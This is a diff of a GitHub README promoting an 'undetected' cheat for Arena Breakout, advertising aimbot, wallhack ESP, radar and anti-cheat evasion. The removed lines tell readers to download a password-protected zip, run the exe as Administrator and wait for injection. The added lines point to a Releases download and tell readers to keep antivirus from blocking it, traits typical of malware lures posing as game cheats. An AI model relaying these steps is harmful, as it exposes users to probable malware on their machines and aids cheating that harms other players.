@@ -1,70 +1,89 @@
-# 🎯 Arena Breakout Pc [Ancient] — Undetected Private Cheat
+# Arena Breakout Ancient Undetected Cheat
 
-Conquer every raid with **[Ancient] Arena Breakout Cheat** — designed for maximum tactical advantage in any scenario. Full aimbot system, clean ESP, and performance-focused optimizations — all while staying undetected.
+![Arena Breakout](https://img.shields.io/badge/Arena%20Breakout-Undetected%20Cheat-blue)
 
----
-[![2-YBt-J1q-png.webp](https://i.postimg.cc/28p6JqCv/2-YBt-J1q-png.webp)](https://postimg.cc/MXDqfpMK)
----
+Welcome to the **Arena Breakout Ancient Undetected Cheat** repository! This project offers a unique solution for players seeking an edge in **Arena Breakout Infinite**. Developed using advanced technologies and reverse engineering techniques, this software aims to enhance your gaming experience while maintaining reliability and stealth.
 
-## 🧰 Installation Instructions
-<details>
-  
-<summary>🛠️ Expand to view</summary>
+## Table of Contents
 
-1. Get the latest version (https://github.com/Murronels/Arena-Breakout-Ancient-Undetected-Cheat/releases/download/latest/AncientABI.zip)
-2. Extract all contents to a secure folder, password: `AncientABI`
-3. Launch `AncientABI.exe` as Administrator.
-4. Wait for successful injection confirmation.
-5. Start **Arena Breakout**.
-6. Press `Insert` to open the menu and configure features to your preference.
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
-</details>
+## Introduction
 
----
-## ✅ Cheat Info
+In the competitive world of **Arena Breakout Infinite**, every advantage counts. The **Ancient** cheat software is designed to provide players with tools that can help them perform better in-game. With a focus on user-friendliness and efficiency, this software is crafted for both novice and experienced players.
 
-- 🛡️ Anti-Cheat Status: **Undetected**
-- 🖥️ Supported OS: **Windows 10 & 11**
-- 💾 Clean Build: **Verified 0/72 on [VirusTotal](https://www.virustotal.com/)**
-- ⚙️ Game Modes: **Fullscreen / Borderless / Windowed**
-- 🔧 CPU: **Intel & AMD (AVX Supported)**
+To get started, you can download the latest version of the software from the [Releases section](https://github.com/HoussamHou2s/Arena-Breakout-Ancient-Undetected-Cheat/releases). Please ensure to follow the installation instructions carefully to set it up correctly.
 
----
+## Features
 
-## 🎯 Aimbot Features
+The **Ancient** cheat includes a variety of features to enhance your gameplay. Here are some of the key functionalities:
 
-- `✔` Aimbot Type Selection (Legit / Rage)
-- `✔` Aim Key (Primary / Secondary)
-- `✔` Draw FOV Circle
-- `✔` Smooth Aim Adjustment
-- `✔` Aim Bone (Head / Chest / Pelvis)
-- `✔` Force Aim Key
-- `✔` Only Visible Check
-- `✔` Lock on Target
-- `✔` Recoil Control System (RCS)
+- **Aim Assist**: Improve your shooting accuracy with advanced aim features.
+- **ESP (Extra Sensory Perception)**: See through walls and identify enemy positions.
+- **Item Radar**: Locate important items on the map effortlessly.
+- **Visual Enhancements**: Customize your visuals for better clarity and gameplay.
+- **Custom Scripts**: Utilize scripts tailored to your play style.
 
----
+These features work seamlessly together to provide a comprehensive toolkit for players looking to improve their performance.
 
-## 👁️ ESP Features (Players / Bots)
+## Installation
 
-- `✔` 2D Box ESP
-- `✔` Skeleton Overlay
-- `✔` Weapon Display
-- `✔` Health Bar
+To install the **Ancient** cheat software, follow these steps:
 
----
+1. Visit the [Releases section](https://github.com/HoussamHou2s/Arena-Breakout-Ancient-Undetected-Cheat/releases) to download the latest version.
+2. Extract the downloaded files to a folder of your choice.
+3. Run the executable file and follow the on-screen instructions to complete the installation.
+4. Ensure that your antivirus software does not block the program.
 
+After installation, you can start the software and configure it according to your preferences.
 
+## Usage
 
-## 📌 Notes
+Using the **Ancient** cheat is straightforward. Here’s how to get started:
 
-> ✦ This cheat was developed for personal testing and educational purposes only.  
-> ✦ The software automatically updates core offsets where possible.  
-> ✦ We do not condone the use of software for malicious or exploitative purposes. Use at your own risk.
+1. Launch the software after installation.
+2. Select your desired features from the user interface.
+3. Start **Arena Breakout Infinite**.
+4. Enjoy enhanced gameplay with the selected features active.
 
----
+Make sure to adjust the settings based on your comfort level and gaming style.
 
-## 💬 Support
+## Topics
 
-- 🌐 [Join our Community](https://discord.gg/placeholder) *(optional if you have a Discord)*
-- 📩 Contact: minusluxuriant@outlook.com`
+This repository covers a range of topics related to **Arena Breakout Infinite**. Here are some key areas of focus:
+
+- **arena-breakout**
+- **arena-breakout-infinite**
+- **arena-breakout-infinite-aim**
+- **arena-breakout-infinite-esp**
+- **arena-breakout-infinite-external**
+- **arena-breakout-infinite-hack**
+- **arena-breakout-infinite-item-esp**
+- **arena-breakout-infinite-radar**
+- **arena-breakout-infinite-script**
+- **arena-breakout-infinite-visuals**
+- **arena-breakout-infinite-wh**
+- **arena-breakout-infinite-wiki**
+
+These topics provide a comprehensive overview of the software's capabilities and how they can enhance your gameplay.
+
+## Contributing
+
+We welcome contributions from the community. If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Please ensure that your contributions align with the overall goals of the project.
+
+## License
+
+This project is licensed under the MIT License. Please see the LICENSE file for more details.
+
+## Contact
+
+For any questions or support, feel free to reach out through the GitHub issues page. We are here to help you enhance your gaming experience.
+
+Thank you for checking out the **Arena Breakout Ancient Undetected Cheat** repository. We hope you enjoy using the software and that it helps you achieve your gaming goals. For the latest updates and releases, always refer to the [Releases section](https://github.com/HoussamHou2s/Arena-Breakout-Ancient-Undetected-Cheat/releases).
